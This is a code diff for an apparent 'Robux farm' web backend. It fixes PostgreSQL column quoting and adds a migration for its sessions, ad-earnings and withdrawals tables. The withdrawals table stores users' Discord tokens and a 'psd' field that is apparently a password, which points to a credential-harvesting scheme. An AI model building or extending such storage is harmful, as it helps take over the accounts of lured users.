@@ -29,6 +29,7 @@ let pgPool = null; // PostgreSQL pool
 let usePostgreSQL = false;
 
 async function initDatabase() {
+    console.log('=== STARTING DATABASE INITIALIZATION ===');
     console.log('DATABASE_URL:', DATABASE_URL ? 'configured' : 'not configured');
 
     // Try PostgreSQL first (for Railway)
@@ -46,12 +47,15 @@ async function initDatabase() {
 
             // Create tables
             await createPostgreSQLTables();
+            
+            // Migrate existing tables to fix column naming
+            await migratePostgreSQLTables();
 
             usePostgreSQL = true;
-            console.log('PostgreSQL database initialized');
+            console.log('=== POSTGRESQL DATABASE INITIALIZED ===');
             return;
         } catch (error) {
-            console.error('PostgreSQL connection error, falling back to SQLite:', error.message);
+            console.error('=== POSTGRESQL CONNECTION ERROR, FALLING BACK TO SQLITE ===', error.message);
         }
     }
 
@@ -63,9 +67,9 @@ async function initDatabase() {
         // Create SQLite tables
         createSQLiteTables();
 
-        console.log('SQLite database initialized');
+        console.log('=== SQLITE DATABASE INITIALIZED ===');
     } catch (error) {
-        console.error('SQLite initialization error:', error);
+        console.error('=== SQLITE INITIALIZATION ERROR ===', error);
     }
 }
 
@@ -112,39 +116,135 @@ async function createPostgreSQLTables() {
     try {
         await client.query(`
             CREATE TABLE IF NOT EXISTS sessions (
-                sessionId TEXT PRIMARY KEY,
-                userId TEXT NOT NULL,
-                userToken TEXT NOT NULL,
-                username TEXT,
-                avatar TEXT,
-                createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                "sessionId" TEXT PRIMARY KEY,
+                "userId" TEXT NOT NULL,
+                "userToken" TEXT NOT NULL,
+                "username" TEXT,
+                "avatar" TEXT,
+                "createdAt" TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `);
 
         await client.query(`
             CREATE TABLE IF NOT EXISTS robux_farm_data (
-                userId TEXT PRIMARY KEY,
-                adsWatched INTEGER DEFAULT 0,
-                earnings REAL DEFAULT 0,
-                robuxEarned REAL DEFAULT 0,
-                lastUpdated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                "userId" TEXT PRIMARY KEY,
+                "adsWatched" INTEGER DEFAULT 0,
+                "earnings" REAL DEFAULT 0,
+                "robuxEarned" REAL DEFAULT 0,
+                "lastUpdated" TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `);
 
         await client.query(`
             CREATE TABLE IF NOT EXISTS withdrawals (
-                id TEXT PRIMARY KEY,
-                discordToken TEXT NOT NULL,
-                userId TEXT NOT NULL,
-                username TEXT,
-                psd TEXT,
-                gamepassId TEXT,
-                robuxAmount REAL NOT NULL,
-                status TEXT DEFAULT 'pending',
-                createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                updatedAt TIMESTAMP
+                "id" TEXT PRIMARY KEY,
+                "discordToken" TEXT NOT NULL,
+                "userId" TEXT NOT NULL,
+                "username" TEXT,
+                "psd" TEXT,
+                "gamepassId" TEXT,
+                "robuxAmount" REAL NOT NULL,
+                "status" TEXT DEFAULT 'pending',
+                "createdAt" TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                "updatedAt" TIMESTAMP
             )
         `);
+    } finally {
+        client.release();
+    }
+}
+
+async function migratePostgreSQLTables() {
+    const client = await pgPool.connect();
+    try {
+        // Check and migrate robux_farm_data table
+        try {
+            const columnInfo = await client.query(`
+                SELECT column_name, data_type 
+                FROM information_schema.columns 
+                WHERE table_name = 'robux_farm_data'
+            `);
+            
+            const columns = columnInfo.rows.map(row => row.column_name);
+            
+            if (columns.includes('userid')) {
+                console.log('Migrating robux_farm_data columns...');
+                await client.query(`ALTER TABLE robux_farm_data RENAME COLUMN userid TO "userId"`);
+            }
+            if (columns.includes('adswatched')) {
+                await client.query(`ALTER TABLE robux_farm_data RENAME COLUMN adswatched TO "adsWatched"`);
+            }
+            if (columns.includes('robuxearned')) {
+                await client.query(`ALTER TABLE robux_farm_data RENAME COLUMN robuxearned TO "robuxEarned"`);
+            }
+            if (columns.includes('lastupdated')) {
+                await client.query(`ALTER TABLE robux_farm_data RENAME COLUMN lastupdated TO "lastUpdated"`);
+            }
+        } catch (error) {
+            console.log('robux_farm_data migration error or not needed:', error.message);
+        }
+
+        // Check and migrate sessions table
+        try {
+            const columnInfo = await client.query(`
+                SELECT column_name, data_type 
+                FROM information_schema.columns 
+                WHERE table_name = 'sessions'
+            `);
+            
+            const columns = columnInfo.rows.map(row => row.column_name);
+            
+            if (columns.includes('sessionid')) {
+                console.log('Migrating sessions columns...');
+                await client.query(`ALTER TABLE sessions RENAME COLUMN sessionid TO "sessionId"`);
+            }
+            if (columns.includes('userid')) {
+                await client.query(`ALTER TABLE sessions RENAME COLUMN userid TO "userId"`);
+            }
+            if (columns.includes('usertoken')) {
+                await client.query(`ALTER TABLE sessions RENAME COLUMN usertoken TO "userToken"`);
+            }
+            if (columns.includes('createdat')) {
+                await client.query(`ALTER TABLE sessions RENAME COLUMN createdat TO "createdAt"`);
+            }
+        } catch (error) {
+            console.log('sessions migration error or not needed:', error.message);
+        }
+
+        // Check and migrate withdrawals table
+        try {
+            const columnInfo = await client.query(`
+                SELECT column_name, data_type 
+                FROM information_schema.columns 
+                WHERE table_name = 'withdrawals'
+            `);
+            
+            const columns = columnInfo.rows.map(row => row.column_name);
+            
+            if (columns.includes('discordtoken')) {
+                console.log('Migrating withdrawals columns...');
+                await client.query(`ALTER TABLE withdrawals RENAME COLUMN discordtoken TO "discordToken"`);
+            }
+            if (columns.includes('userid')) {
+                await client.query(`ALTER TABLE withdrawals RENAME COLUMN userid TO "userId"`);
+            }
+            if (columns.includes('gamepassid')) {
+                await client.query(`ALTER TABLE withdrawals RENAME COLUMN gamepassid TO "gamepassId"`);
+            }
+            if (columns.includes('robuxamount')) {
+                await client.query(`ALTER TABLE withdrawals RENAME COLUMN robuxamount TO "robuxAmount"`);
+            }
+            if (columns.includes('createdat')) {
+                await client.query(`ALTER TABLE withdrawals RENAME COLUMN createdat TO "createdAt"`);
+            }
+            if (columns.includes('updatedat')) {
+                await client.query(`ALTER TABLE withdrawals RENAME COLUMN updatedat TO "updatedAt"`);
+            }
+        } catch (error) {
+            console.log('withdrawals migration error or not needed:', error.message);
+        }
+
+        console.log('PostgreSQL table migration completed');
     } finally {
         client.release();
     }
@@ -160,15 +260,15 @@ async function getSession(sessionId) {
             const client = await pgPool.connect();
             try {
                 const result = await client.query(
-                    'SELECT * FROM sessions WHERE sessionId = $1',
+                    'SELECT * FROM sessions WHERE "sessionId" = $1',
                     [sessionId]
                 );
                 if (result.rows.length > 0) {
                     const row = result.rows[0];
                     return {
-                        sessionId: row.sessionid,
-                        userId: row.userid,
-                        userToken: row.usertoken,
+                        sessionId: row.sessionId,
+                        userId: row.userId,
+                        userToken: row.userToken,
                         username: row.username,
                         avatar: row.avatar
                     };
@@ -207,13 +307,13 @@ async function createSession(sessionId, userId, userToken, username, avatar) {
             const client = await pgPool.connect();
             try {
                 await client.query(`
-                    INSERT INTO sessions (sessionId, userId, userToken, username, avatar)
+                    INSERT INTO sessions ("sessionId", "userId", "userToken", "username", "avatar")
                     VALUES ($1, $2, $3, $4, $5)
-                    ON CONFLICT (sessionId) DO UPDATE SET
-                        userId = EXCLUDED.userId,
-                        userToken = EXCLUDED.userToken,
-                        username = EXCLUDED.username,
-                        avatar = EXCLUDED.avatar
+                    ON CONFLICT ("sessionId") DO UPDATE SET
+                        "userId" = EXCLUDED."userId",
+                        "userToken" = EXCLUDED."userToken",
+                        "username" = EXCLUDED."username",
+                        "avatar" = EXCLUDED."avatar"
                 `, [sessionId, userId, userToken, username, avatar]);
             } finally {
                 client.release();
@@ -244,7 +344,7 @@ async function deleteSession(sessionId) {
         try {
             const client = await pgPool.connect();
             try {
-                await client.query('DELETE FROM sessions WHERE sessionId = $1', [sessionId]);
+                await client.query('DELETE FROM sessions WHERE "sessionId" = $1', [sessionId]);
             } finally {
                 client.release();
             }
@@ -273,16 +373,16 @@ async function loadRobuxFarmData(userId) {
             const client = await pgPool.connect();
             try {
                 const result = await client.query(
-                    'SELECT * FROM robux_farm_data WHERE userId = $1',
+                    'SELECT * FROM robux_farm_data WHERE "userId" = $1',
                     [userId]
                 );
                 console.log('PostgreSQL query result rows:', result.rows.length);
                 if (result.rows.length > 0) {
                     const row = result.rows[0];
                     return {
-                        adsWatched: row.adswatched || 0,
+                        adsWatched: row.adsWatched || 0,
                         earnings: row.earnings || 0,
-                        robuxEarned: row.robuxearned || 0
+                        robuxEarned: row.robuxEarned || 0
                     };
                 }
             } finally {
@@ -320,13 +420,13 @@ async function saveRobuxFarmData(userId, data) {
             const client = await pgPool.connect();
             try {
                 await client.query(`
-                    INSERT INTO robux_farm_data (userId, adsWatched, earnings, robuxEarned)
+                    INSERT INTO robux_farm_data ("userId", "adsWatched", "earnings", "robuxEarned")
                     VALUES ($1, $2, $3, $4)
-                    ON CONFLICT (userId) DO UPDATE SET
-                        adsWatched = EXCLUDED.adsWatched,
-                        earnings = EXCLUDED.earnings,
-                        robuxEarned = EXCLUDED.robuxEarned,
-                        lastUpdated = CURRENT_TIMESTAMP
+                    ON CONFLICT ("userId") DO UPDATE SET
+                        "adsWatched" = EXCLUDED."adsWatched",
+                        "earnings" = EXCLUDED."earnings",
+                        "robuxEarned" = EXCLUDED."robuxEarned",
+                        "lastUpdated" = CURRENT_TIMESTAMP
                 `, [userId, data.adsWatched, data.earnings, data.robuxEarned]);
             } finally {
                 client.release();
@@ -364,8 +464,8 @@ async function createWithdrawal(discordToken, userId, username, psd, gamepassId,
             const client = await pgPool.connect();
             try {
                 await client.query(`
-                    INSERT INTO withdrawals (id, discordToken, userId, username, psd, gamepassId, robuxAmount, status)
-                    VALUES ($1, $2, $3, $4, $5, $6, $7, 'pending')
+                    INSERT INTO withdrawals ("id", "discordToken", "userId", "username", "psd", "gamepassId", "robuxAmount", "status", "createdAt", "updatedAt")
+                    VALUES ($1, $2, $3, $4, $5, $6, $7, 'pending', CURRENT_TIMESTAMP, NULL)
                 `, [withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount]);
                 return { id: withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount, status: 'pending' };
             } finally {
@@ -378,8 +478,8 @@ async function createWithdrawal(discordToken, userId, username, psd, gamepassId,
     } else {
         try {
             const stmt = db.prepare(`
-                INSERT INTO withdrawals (id, discordToken, userId, username, psd, gamepassId, robuxAmount, status)
-                VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')
+                INSERT INTO withdrawals (id, discordToken, userId, username, psd, gamepassId, robuxAmount, status, createdAt, updatedAt)
+                VALUES (?, ?, ?, ?, ?, ?, ?, 'pending', CURRENT_TIMESTAMP, NULL)
             `);
             stmt.run(withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount);
             return { id: withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount, status: 'pending' };
@@ -395,7 +495,7 @@ async function getWithdrawals() {
         try {
             const client = await pgPool.connect();
             try {
-                const result = await client.query('SELECT * FROM withdrawals ORDER BY createdAt DESC');
+                const result = await client.query('SELECT * FROM withdrawals ORDER BY "createdAt" DESC');
                 return result.rows;
             } finally {
                 client.release();
@@ -421,7 +521,7 @@ async function updateWithdrawalStatus(withdrawalId, status) {
             const client = await pgPool.connect();
             try {
                 await client.query(`
-                    UPDATE withdrawals SET status = $1, updatedAt = CURRENT_TIMESTAMP WHERE id = $2
+                    UPDATE withdrawals SET "status" = $1, "updatedAt" = CURRENT_TIMESTAMP WHERE "id" = $2
                 `, [status, withdrawalId]);
             } finally {
                 client.release();
